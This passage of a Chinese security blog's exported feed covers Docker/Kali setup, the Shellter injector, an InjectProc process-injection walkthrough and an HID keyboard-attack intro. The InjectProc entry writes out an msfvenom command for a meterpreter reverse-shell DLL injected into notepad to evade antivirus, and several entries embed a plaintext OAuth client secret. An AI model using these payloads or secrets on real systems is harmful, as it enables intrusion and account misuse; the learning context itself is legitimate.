-<p> <span style="color: #ffff99;">解决方案：（Windows环境下手动更新boot2docker.iso）下载boot2docker.ISO    进行替换该C盘当前用户目录下的   .docker/machine/cache\boot2docker.iso 的boot2docker.iso这个镜像文件进行一个替换</span> <img src="http://ojg8j426f.bkt.clouddn.com/1491230816377.jpg" alt="enter description here"><br>即可解决下载错误。</p>
-<p><img src="http://ojg8j426f.bkt.clouddn.com/094503_jsqI_2621890.png" alt="enter description here"></p>
-<p><br></p>
-<h2 id="0x03-linux下安装docker"><a href="#0x03-linux下安装docker" class="headerlink" title="0x03 linux下安装docker"></a>0x03 linux下安装docker</h2><p>linux下安装docker最低系统安装要求为： Ubuntu 版本最低为 12.04 LTS，但从稳定性上考虑，推荐使用 14.04 LTS 或更高的版本。Debian 7 Wheezy (64-bit)（必须启用 backports)<br>linux下安装docker 使用以下命令即可进行安装。<br>我这边就使用深度linux64位 来举例子安装在linux下安装说明吧！</p>
-<pre>apt-get install docker.io</pre>
-
-<p><img src="http://ojg8j426f.bkt.clouddn.com/1491236394491.jpg" alt="enter description here"><br>&nbsp;<br><span style="color: #ffff99;">建立 docker 用户组</span><br>&nbsp;</p>
-<p>默认情况下，docker 命令会使用 Unix socket 与 Docker 引擎通讯。而只有 root 用户和 docker 组的用户才可以访问 Docker 引擎的 Unix socket。出于安全考虑，一般 Linux 系统上不会直接使用 root 用户。因此，更好地做法是将需要使用 docker 的用户加入 docker 用户组<br>安装docker.io 的时候已经自动添加了docker用户组，只需将当前非root权限的用户 添加docker组即可</p>
-<pre>usermod -aG docker $USER</pre>
-
-
-<p>&nbsp;<br>&nbsp;<br>&nbsp;</p>
-<h2 id="0x04-Mac-os-X-下-安装"><a href="#0x04-Mac-os-X-下-安装" class="headerlink" title="0x04 Mac os X 下 安装"></a>0x04 Mac os X 下 安装</h2><p>苹果系统安装我这里就没什么好说的了，苹果系统下的都是一键安装的。<br>Docker for mac 下载链接：<a href="https://www.docker.com/docker-mac" target="_blank" rel="external">https://www.docker.com/docker-mac</a><br>去官网下载docker安装即可<br><img src="http://ojg8j426f.bkt.clouddn.com/1491239502131.jpg" alt="enter description here"><br>&nbsp;<br>将安装包下载后，拖放应用程序即可。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491239397989.jpg" alt="enter description here"><br>&nbsp;<br>安装后，启动docker后可在，右上角看到docker -小鲸鱼的图标。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491239371298.jpg" alt="enter description here"></p>
-<p>&nbsp;<br>安装后可在终端下直接使用docker命令。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491239555703.jpg" alt="enter description here"></p>
-<p>&nbsp;<br>&nbsp;</p>
-<h2 id="0x10-Docker-常用命令简单使用实例"><a href="#0x10-Docker-常用命令简单使用实例" class="headerlink" title="0x10 Docker 常用命令简单使用实例"></a>0x10 Docker 常用命令简单使用实例</h2><p>&nbsp;<br><strong><span style="color: #ffff99;">1.搜索镜像</span></strong><br>&nbsp;</p>
-<p></p><h4>docker search 镜像名称</h4><br> kali官方 docker镜像拉取说明:<a href="https://www.kali.org/news/official-kali-linux-docker-images/" target="_blank" rel="external">https://www.kali.org/news/official-kali-linux-docker-images/</a><p></p>
-<p> 搜索kali 镜像</p>
-<pre>docker search kali</pre>
-
-<p><img src="http://ojg8j426f.bkt.clouddn.com/1491238412622.jpg" alt="enter description here"><br>&nbsp;<br><strong><span style="color: #ffff99;">2.docker_kali镜像拉取下载</span></strong><br>&nbsp;</p>
-<p><pre>docker pull kalilinux/kali-linux-docker</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491271361357.jpg" alt="enter description here"><br> <br><br> 不过在这里会产生一个问题，镜像下载慢！！因为镜像在国外,所以下载过程可能会延迟掉线这样会非常不友好。<br> &nbsp;<br><strong><span style="color: #ffff99;"> 3.我们可以使用几个国内的docker镜像加速器 阿里云加速器&amp;DaoCloud 加速器！！！！！</span></strong><br>&nbsp;<br>如果你使用的docker是docker for windows 、或者docker for mac 的话 推荐可使用‘DaoCloud 加速器’  <a href="https://www.daocloud.io/mirror#accelerator-doc" target="_blank" rel="external">https://www.daocloud.io/mirror#accelerator-doc</a>  </p>
-<p>&nbsp;<br>一、在‘DaoCloud 加速器’ 注册登录后 进行复制镜像地址，到docker下进行设置。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/98A7F397-7E2C-436D-A7D7-75F3E568CFAD.png" alt="enter description here"></p>
-<p>二、右键点击桌面顶栏的 docker 图标，选择 Preferences，找到Daemon，在registy mirrors 中添加，并应用重启docker（apply&amp;restart）<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/9C71A3C0-D6CC-42C6-B95A-BE57D1C0E7A1.png" alt="enter description here"></p>
-<p><strong><span style="color: #ffff99;">4.如果你是linux 或者docker tools box 的话 可以选择阿里云加速器–docker镜像仓库。</span></strong><br>&nbsp;<br><a href="https://account.aliyun.com/login/login.htmoauth_callback=https%3A%2F%2Fcr.console.aliyun.com%2F&amp;lang=zh#/accelerator" target="_blank" rel="external">https://account.aliyun.com/login/login.htmoauth_callback=https%3A%2F%2Fcr.console.aliyun.com%2F&amp;lang=zh#/accelerator</a></p>
-<p><img src="http://ojg8j426f.bkt.clouddn.com/AE9B5A19-6CE4-4243-919A-104701E192AD.png" alt="enter description here"><br>&nbsp;<br>查看阿里云加速器操作文档，以及docker的版本，进行对应操作。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491272245455.jpg" alt="enter description here"><br>&nbsp;<br>配置完之后，镜像开启加速下载如下图；<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/B53F5C74-BE41-4B29-A2F3-8EE7BCBE6787.png" alt="enter description here"></p>
-<p><strong><span style="color: #ffff99;">5.创建并连接容器、端口映射、绑定随机id</span></strong><br>&nbsp;</p>
-<p><pre>docker run -i -t –name kali  -p 8081:80  -p 8080:8080  -p 4444:4444  -p 5555:5555  -p 2222:22  kalilinux/kali-linux-docker  /bin/bash </pre></p><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491272631908.jpg" alt="enter description here"><br>&nbsp;<br>命令详解：<br>一、run命令简单使用<br><p><pre>docker run -i -t //创建并连接容器， run命令参数使用    -i: 以交互模式运行容器，通常与 -t 同时使用；-t: 为容器重新分配一个伪输入终端，通常与 -i 同时使用</pre></p><br>&nbsp;<br>在这里我们使用docker ps -a  查看docker容器运行、创建的历史记录，可以发现你每次创建一个容器的时候都会生成一个随机id、容器名称，在81324e6f0059我们可以看到，这是我们之前生成的，也是指定了容器的名称，将ID、名称附着在容器上。<br><pre>docker  ps -a</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/80AE92EB-A59E-4D49-8DFB-31A89C940E1E.png" alt="enter description here"><br><strong><span style="color: #ffff99;">二、Docker 会为我们创建每一个容器自动生成一个随机ID、名称，如果想为容器指定一个名称，而不是使用自动生成的，则可以使用–name 来使用</span></strong><br>&nbsp;<br>如：<pre>–name kali  //指定容器名称为kali</pre><br><br><br><strong><span style="color: #ffff99;">三、容器端口映射</span></strong><br>docker指令：docker run -p ip:hostPort:containerPort redis<br>&nbsp;<br>使用-p参数会分配宿主机的端口映射到虚拟机。<br>IP表示主机的IP地址。<br>hostPort表示宿主机的端口。<br>containerPort表示虚拟机的端口。<br>以下为端口映射实例图片对比：<br><img src="http://ojg8j426f.bkt.clouddn.com/1491275131945.jpg" alt="enter description here"><br><img src="http://ojg8j426f.bkt.clouddn.com/1491297367379.jpg" alt="enter description here"><br><br>我们也可以采用 指定容器端口映射本机随机端口,防止本机端口占用等情况。<br><strong><span style="color: #ffff99;">格式为-p &lt;空&gt;:容器需映射端口</span></strong><br><strong><span style="color: #ffff99;">可指定物理机的随机端口 映射容器端口</span></strong><br><pre> docker run -i -t  -v /Users/demon:/root  -p :4444 -p :5555 -p :22 kali /bin/bash</pre><br>&nbsp;<br>端口被占用<br><img src="http://ojg8j426f.bkt.clouddn.com/1491275841716.jpg" alt="enter description here"><br>&nbsp;<br>指定随机端口为空。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491275732022.jpg" alt="enter description here"><br>&nbsp;<br>映射为随机端口<br><img src="http://ojg8j426f.bkt.clouddn.com/87923B06-18E6-4872-B6A0-38A2F6184F48.png" alt="enter description here"><br>&nbsp;<br><br><strong><span style="color: #ffff99;">四、使用-v 参数实现目录共享挂载，docker可以支持把一个宿主机上的目录挂载到镜像里。通过-v参数，冒号前为宿主机目录，必须为绝对路径，冒号后为镜像内挂载的路径。现在镜像内就可以共享宿主机里的文件了。然而我这边不打算采用目录共享，可用ssh的特性进行文件传输上传下载等功能</span></strong><br><pre>docker run -i -t  -v /Users/demon:/root  -p :4444 -p :5555 -p :22 kali /bin/bash</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/0CDE2A94-D007-4486-BD9F-02982CC894EA.png" alt="enter description here"><br><br><strong><span style="color: #ffff99;">6.查看列举本地镜像。</span></strong><br>&nbsp;<br><pre>docker images</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/1491276720374.jpg" alt="enter description here"><br>&nbsp;<br><strong><span style="color: #ffff99;">7.开启容器</span></strong><br>&nbsp;<br><strong>start命令</strong><br>docker start  容器ID or 容器名称<br>&nbsp;<br><pre>docker start  e8d612658eb0</pre><br><img src="http://ojg8j426f.bkt.clouddn.com/C1922BA7-33CD-48AE-9576-24F21572A399.png" alt="enter description here"><br>&nbsp;<br>容器名称可指容器随机生成的名称亦可是–name 指定过的名称 如之前指定的是kali 这里就可以使用 docker start kali<br><img src="http://ojg8j426f.bkt.clouddn.com/1491277103204.jpg" alt="enter description here"><br><br><br><strong><span style="color: #ffff99;">8.连接容器</span></strong><br>&nbsp;<br><strong>attach 命令</strong><br>docker attach 是Docker自带的命令。下面示例如何使用该命令。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491279122026.jpg" alt="enter description here"><br>但是使用 attach 命令有时候并不方便。当多个窗口同时 attach 到同一个容器的时候，所有窗口都会同步显示。当某个窗口因命令阻塞时,其他窗口也无法执行操作了。<br>&nbsp;<br>同样docker attach 可以接上容器名称or 容器ID<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/3E7A608E-50F0-41BE-A89E-24DD648425BA.png" alt="enter description here"><br>&nbsp;<br>使用attach 窗口占用解决方案    &nbsp; 1.使用kimtematic GUI管理工具 点击exec。<br>&nbsp;2.使用命令行 exec命令<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491286106067.jpg" alt="enter description here"><br>&nbsp;<br><pre>docker exec -it kali /bin/bash</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491286369676.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491286106067.jpg" alt="enter description here"><br>&nbsp;<br><strong><span style="color: #ffff99;">9.停止容器</span></strong><br>&nbsp;<br>在容器内使用exit即停止容器<br><img src="http://ojg8j426f.bkt.clouddn.com/1491279468779.jpg" alt="enter description here"><br>&nbsp;<br>或在容器外使用stop命令即停止容器<br><img src="http://ojg8j426f.bkt.clouddn.com/30BD9BC4-E5C6-4FD3-8750-C5D92BF0E02A.png" alt="enter description here"><br>&nbsp;<br><strong><span style="color: #ffff99;">10.删除容器</span></strong><br>&nbsp;<br>rm命令<br>使用rm命令之前必须停止该运行的容器。<br>docker rm 容器id or 容器名称<br><img src="http://ojg8j426f.bkt.clouddn.com/1491279919070.jpg" alt="enter description here"><br>&nbsp;<br><br><img src="http://ojg8j426f.bkt.clouddn.com/1491279954846.jpg" alt="enter description here"><br><br><strong><span style="color: #ffff99;">11.批量删除停止容器</span></strong><br>&nbsp;<br>docekr ps -a -q 查看容器停止或者正在运行的容器id<br>docker rm 之前也说到过 是删除容器的意思，但是docker rm 本身默认的是不会删除正在运行的容器。如此一来 docker rm $(docker ps -a -q)  的意思就是 批量删除停止的容器。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491280028649.jpg" alt="enter description here"><br><br><strong><span style="color: #ffff99;">12.删除本地镜像</span></strong><br> docker rmi  镜像名or 镜像ID     删除之前需停止容器并删除和该镜像关联的容器<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/0737CD0E-62EC-4066-9D64-0A7B4E7A39D6.png" alt="enter description here"><br>&nbsp;<br><strong><span style="color: #ffff99;">13.将容器做备份快照迁移。</span></strong><br>Docker是基于镜像的。镜像类似于已经包含了文件、配置和安装好的程序的虚拟机镜像。同样的，你可以像启动虚拟机一样启动多个镜像实例。运行中的镜像称为容器。你可以修改容器（比如删除一个文件），但这些修改不会影响到镜像。不过，你使用docker commit <container-id> <image-name>命令可以把一个正在运行的容器变成一个新的镜像。<br>&nbsp;<br>docker save : 将指定镜像保存成 tar 归档文件。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491283188996.jpg" alt="enter description here"><br>&nbsp;<br>Export命令用于持久化容器（不是镜像）。<br><img src="http://ojg8j426f.bkt.clouddn.com/1491283416405.jpg" alt="enter description here"><br>&nbsp;<br>以上同样都是导出，但是区别在于save 是导出镜像而不是导出容器，export是导出容器，历史记录但不能历史层回滚。反而使用export命令导出保存快照，你将无法回滚到之前的层(layer)。<br>以下是使用导入save的镜像以及export的镜像，导入镜像的大小。<br>&nbsp;<br>&nbsp;<br><pre>docker load -i  kali.tar </pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491284429626.jpg" alt="enter description here"><br>&nbsp;<br><pre>docker import kali.tar kali</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491284611770.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><strong><span style="color: #ffff99;">14 .docker 资源占用之内存</span></strong><br>docker stats可以观察到此时的资源使用情况是固定不变的<br><p><pre> docker stats</pre></p><br><img src="http://ojg8j426f.bkt.clouddn.com/1491287009622.jpg" alt="enter description here"><br>&nbsp;<br>使用-m 参数可指定内容（m、g）使用docker -m操作会使内存被限制为输入大小的两倍，内存上限为400m<br><img src="http://ojg8j426f.bkt.clouddn.com/1491287242869.jpg" alt="enter description here"><br>&nbsp;<br>可使用内存压力测试工具：stress，对内存进行测试。<br>若运行后在几秒内被杀死说明内存被限制为400M<br><img src="http://ojg8j426f.bkt.clouddn.com/1491287897151.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br><br><br><strong><span style="color: #ffff99;">15.尝试写一份简单的Dockerfile</span></strong><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491290859872.jpg" alt="enter description here"><br><p><pre><br>FROM kalilinux/kali-linux-docker<br># 拉取官方kali镜像<br><br>MAINTAINER Demon<br>#注明作者<br><br>RUN apt-get update &amp;&amp; apt-get install -y \<br>  sqlmap \<br>  ssh \<br>  –no-install-recommends &amp;&amp; rm -rf /var/cache/apt/archives/*.deb<br>#使run 命令 执行 要安装的软件如安装ssh 、sqlmap 以及清理缓存<br><br><br>ADD sshd_config /etc/ssh/<br>#添加本地文件到容器的/etc/ssh/sshd_config 进行替换。<br></pre></p>
-
-<p>dockerfile实现了自动拉去镜像、构建镜像、自动更新源、下载安装sqlmap、配置ssh等动作。<br>&nbsp;<br>docker build -t  kalil .  //编写完成 Dockerfile 后可以使用docker build来生成镜像。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1491289836365.jpg" alt="enter description here"><br>&nbsp;</p>
-<p><img src="http://ojg8j426f.bkt.clouddn.com/1491289007362.jpg" alt="enter description here"><br>&nbsp;<br>创建并连接容器</p>
-<p><pre>docker run -i -t –name=kali -p 8081:80 -p 8080:8080 -p 4444:4444 -p 5555:5555 -p 2222:22 kalil /bin/bash</pre>.<br>实现sqlmap ssh等配置<br><img src="http://ojg8j426f.bkt.clouddn.com/1491289339017.jpg" alt="enter description here"><br>&nbsp;<br>实现已配置ssh<br><img src="http://ojg8j426f.bkt.clouddn.com/1491289496145.jpg" alt="enter description here"></p>
-<p><br><br>下载链接：<a href="https://github.com/boot2docker/boot2docker/releases" target="_blank" rel="external">https://github.com/boot2docker/boot2docker/releases</a><br><a href="https://www.docker.com" target="_blank" rel="external">https://www.docker.com</a>  docker<br><a href="https://www.docker.com/docker-windows" target="_blank" rel="external">https://www.docker.com/docker-windows</a> docker for windows<br><a href="https://www.docker.com/docker-mac" target="_blank" rel="external">https://www.docker.com/docker-mac</a>   docker for  mac<br><a href="https://www.docker.com/products/docker-toolbox" target="_blank" rel="external">https://www.docker.com/products/docker-toolbox</a> docker tools box<br>参考资料：<a href="https://my.oschina.net/aixiaohua/blog/651171" target="_blank" rel="external">https://my.oschina.net/aixiaohua/blog/651171</a>  Windows环境下手动更新boot2docker.iso<br><a href="http://www.cnblogs.com/franson-2016/p/6412971.html" target="_blank" rel="external">http://www.cnblogs.com/franson-2016/p/6412971.html</a>  解决非root用户使用docker的办法<br><a href="https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html" target="_blank" rel="external">https://yeasy.gitbooks.io/docker_practice/content/install/ubuntu.html</a>  docker入门实践<br>亦可参考 我的好基友国光：<a href="http://www.sqlsec.com/2017/docker.html" target="_blank" rel="external">http://www.sqlsec.com/2017/docker.html</a> docker入门简明。<br><a href="http://www.tuicool.com/articles/EBNZBjJ" target="_blank" rel="external">http://www.tuicool.com/articles/EBNZBjJ</a>  安全相关Docker Image收集<br><a href="https://my.oschina.net/zjzhai/blog/225112" target="_blank" rel="external">https://my.oschina.net/zjzhai/blog/225112</a>  Docker的save和export命令的区别<br><a href="http://blog.csdn.net/u010472499/article/details/52994454" target="_blank" rel="external">http://blog.csdn.net/u010472499/article/details/52994454</a>   Docker 资源限制之内存<br><a href="http://www.jb51.net/article/103483.htm" target="_blank" rel="external">http://www.jb51.net/article/103483.htm</a>  Docker容器内存限制的方法<br><a href="http://os.51cto.com/art/201507/485007.htm" target="_blank" rel="external">http://os.51cto.com/art/201507/485007.htm</a>   Dockerfile命令介绍及实例</p>
-<p><div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-
-
-</image-name></container-id>]]></content>
-      
-        <categories>
-            
-            <category> kali </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> kali </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[shellter]]></title>
-      <url>/shellter.html</url>
-      <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/DDAF8196DB43C0132A64DA22F5CCADB3.png" alt="enter description here"><br><a id="more"></a><br>Shellter<br>Shellter是一个动态的shellcode注入工具，是第一个真正动态的PE infector创建的。<br>它可以用于将shellcode注入本机Windows应用程序（目前仅适用于32位应用程序）。<br>shellcode可以是您或您通过框架生成的东西，如Metasploit。</p>
-<p>Shellter利用PE文件的原始结构，并不适用任何修改，如更改部分内存访问权限（除非用户想要的），添加额外的部分具有RWE访问权限，以及在AV扫描中看起来很诡异的任何内容。</p>
-<p>Shellter采用基于目标应用程序的执行流程的独特动态方法，这只是冰山一角。<br>Shellter不仅仅是一个EPO感染者，试图找到一个位置来插入指令来重定向执行到有效载荷。与任何其他感染者不同，Shellter的高级感染引擎从不将执行流程传输到受感染的PE文件中的代码洞穴或添加的部分。</p>
-<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
-<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
-<script>
-    var ivaInstance = new Iva('ivaLive', {
-        appkey: 'By9WGzBIx', //应用标示
-        video: 'http://oc78wb8cz.bkt.clouddn.com/shellter.mp4', //视频
-        title: 'test', //视频标题，后台视频管理中的标题
-        cover: '' //视频封面，只有在autoplay:false才可生效
-    });
-</script>
-<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
-
-
-<p><a href="https://www.shellterproject.com/introducing-shellter/" target="_blank" rel="external">https://www.shellterproject.com/introducing-shellter/</a><br><a href="https://www.youtube.com/watch?v=5foouybCEk0" target="_blank" rel="external">https://www.youtube.com/watch?v=5foouybCEk0</a></p>
-<p><div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-
-
-]]></content>
-      
-        <categories>
-            
-            <category> Metasploit </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> Metasploit </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[InjectProc&Metasploit]]></title>
-      <url>/InjectProc.html</url>
-      <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg" alt="enter description here"><br><a id="more"></a></p>
-<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
-<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
-<script>
-    var ivaInstance = new Iva('ivaLive', {
-        appkey: 'By9WGzBIx', //应用标示
-        video: 'http://oc78wb8cz.bkt.clouddn.com/InjectProc.mp4', //视频
-        title: 'test', //视频标题，后台视频管理中的标题
-        cover: '' //视频封面，只有在autoplay:false才可生效
-    });
-</script>
-<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
-
-
-<h2 id="InjectProc"><a href="#InjectProc" class="headerlink" title="InjectProc"></a>InjectProc</h2><p>流程注入是一种非常受欢迎的方法来隐藏代码的恶意行为，并被恶意软件作者大量使用。</p>
-<p>有几种技术，通常使用：DLL注入，过程替换（也称为工艺空心），钩注射和APC注射。</p>
-<p>大多数使用相同的Windows API函数：OpenProcess，VirtualAllocEx，WriteProcessMemory，有关这些功能的详细信息，请使用MSDN。<br>&nbsp;</p>
-<h2 id="DLL注入："><a href="#DLL注入：" class="headerlink" title="DLL注入："></a>DLL注入：</h2><p>打开目标进程。<br>分配空间<br>将代码写入远程进程。<br>执行远程代码。<br>&nbsp;<br>具体可以看看github内容介绍。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496581431258.jpg" alt="enter description here"><br>&nbsp;<br>我看了大牛的视频自己学着模仿了一下<br>使用的InjectProc.exe在cmd运行<br><img src="http://ojg8j426f.bkt.clouddn.com/1496581536842.jpg" alt="enter description here"><br>&nbsp;<br>这位大牛在视频中演示四个部分 ，我自己也尝试了模仿了其中的一段，觉得不错，我将自己经验分享给各位。<br>首先我使用的是——  InjectProc.exe  dll_inj  path/to/dll.dll  notepad.exe<br>&nbsp;<br>首先下载到我的桌面，<a href="https://github.com/secrary/InjectProc" target="_blank" rel="external">https://github.com/secrary/InjectProc</a> ，和下载InjectProc.exe，是那位大牛制作完成的。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496582442573.jpg" alt="enter description here"><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496582390129.jpg" alt="enter description here"><br>&nbsp;</p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>首先打开我们的cmd 进入 InjectProc 目录当中，我们可以看到的目录。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496582636284.jpg" alt="enter description here"><br>&nbsp;<br>我们运行InjectProc.exe，并且使用dll_inj 参数，加上xxx.dll的路径 ，加上要注入的进程<br>InjectProc.exe  dll_inj  path/to/dll.dll  notepad.exe。<br>在这里我们使用InjectProc\test_files目录中的<img src="http://ojg8j426f.bkt.clouddn.com/1496583170345.jpg" alt="enter description here">，并且我们随机打开一个进程如记事本进程。<br>使用以下命令：得到 mbox.exe—-InjectProc弹框。并杀软未拦截的情况<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583297150.jpg" alt="enter description here"><br>&nbsp;</p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>那么我们可以想到前阵子NSA 的工具包 使用msf生成的dll，得到会话。那么我们可以做下以下实验。<br>首先我们使用msfvenom 生成dll</p>
-<p><pre>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5555 -f dll &gt;demon.dll</pre><br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583594241.jpg" alt="enter description here"><br>&nbsp;<br>以及打开我们的msf开启监听<br><img src="http://ojg8j426f.bkt.clouddn.com/1496583722323.jpg" alt="enter description here"><br>&nbsp;<br>那么我们将生成好的dll 丢到InjectProc目录中的随便一个文件中，比如我丢到InjectProc\test_files中<img src="http://ojg8j426f.bkt.clouddn.com/1496584076334.jpg" alt="enter description here"><br>&nbsp;<br>使用以下命令,并且打开记事本。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1496584220484.jpg" alt="enter description here"><br>&nbsp;<br>得到最终会话<br><img src="http://ojg8j426f.bkt.clouddn.com/1496580960878.jpg" alt="enter description here"><br>&nbsp;<br>&nbsp;<br>&nbsp;<br>视频资料：<a href="https://www.youtube.com/watch?v=GT9nBuXatmU" target="_blank" rel="external">https://www.youtube.com/watch?v=GT9nBuXatmU</a>   InjectProc | Process Injection Techniques | Malware<br><a href="https://www.pinterest.com/penetrationtesting/" target="_blank" rel="external">https://www.pinterest.com/penetrationtesting/</a><br><a href="https://github.com/secrary/InjectProc" target="_blank" rel="external">https://github.com/secrary/InjectProc</a>   github</p>
-<p><div id="container"></div></p>
-<p><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"></p>
-<script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-  var gitment = new Gitment({
-    owner: 'secistblog',
-    repo: 'secistblog.github.io',
-    oauth: {
-      client_id: '31ca58bed60fa9231b5f',
-      client_secret: '3c99b785b403a00e04363833cd5d59ccef1defb3',
-    },
-  })
-  gitment.render('container')
-</script>
-
-
-]]></content>
-      
-        <categories>
-            
-            <category> Metasploit </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> Metasploit </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[黑手第三篇----DuckHunterHID for mac]]></title>
-      <url>/DuckHunterHID.html</url>
-      <content type="html"><![CDATA[<p><img src="http://ojg8j426f.bkt.clouddn.com/maxresdefault.jpg" alt="enter description here"><br><a id="more"></a><br>  继上一篇nethunter 的HID键盘攻击之后，我打算在我的mac上进行HID攻击，（<a href="http://www.ggsec.cn/nethuner-HID.html" target="_blank" rel="external">http://www.ggsec.cn/nethuner-HID.html</a> ） 这次使用到的是USB-DuckHunter-HID，下面请看背景知识回顾—————–》<br>&nbsp;</p>
-<p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=31209890&auto=0&height=66"></iframe><br>0x00</p>
-<h2 id="HID-键盘攻击"><a href="#HID-键盘攻击" class="headerlink" title="HID 键盘攻击"></a>HID 键盘攻击</h2><p>在这个视频键盘HID攻击被证明。<br>它可以在几秒钟内通过USB将目标解锁机器。它通过模拟键盘和鼠标，盲目地键入受控命令，轻击鼠标指针并使鼠标点击武器。<br>这是什么？<br>几乎每台包括台式机，笔记本电脑，平板电脑和智能手机的电脑都通过键盘输入人类。这就是为什么有一个称为HID或人机接口设备的无处不在的USB标准的规范。简单地说，声称是Keyboard HID的任何USB设备将被大多数现代操作系统自动检测和接受。无论是Windows，Mac，Linux还是Android设备，键盘都是King。</p>
-<p>通过利用这种固有的信任，脚本敲击的速度超过每分钟1000字，传统的对策可以被这个不知疲倦的骑兵绕过 - USB攻击。<br>&nbsp;<br>&nbsp;</p>
-<h2 id="DuckHunter-HID"><a href="#DuckHunter-HID" class="headerlink" title="DuckHunter HID"></a>DuckHunter HID</h2><p>DuckHunter HID选项允许您快速方便地将USB Rubber Ducky脚本转换为NetHunter HID攻击格式。您可以从示例预设菜单中选择一个选项，或从Duck Toolkit站点中选择更多选择的预配置脚本。<br>进攻安全人员再次出现。受欢迎的Pentesting发行版Kali Linux的构建者为Android设备推出了一款名为Kali NetHunter的新工具。该工具是一种移动分销，旨在在Android手机上安装并运行时通过USB危及系统。</p>
-<p>该工具可以通过HID风格的攻击伪装成键盘，发出命令以打开其他攻击中的管理外壳，包括BadUSB中间人风格的攻击。该工具的图片目前可用于Nexus设备，但其他Android设备的构建可能正在进行中。<br>&nbsp;<br><img src="http://ojg8j426f.bkt.clouddn.com/1zdsvb8.jpg" alt="enter description here"></p>
-<p>&nbsp;<br>&nbsp;</p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>   <span style="color: #ff0000;"> 首先我们来看下，黑手（kali_nethunter）的duck_HID 给我们提供了哪些默认的脚本。</span></p>
-<ol>
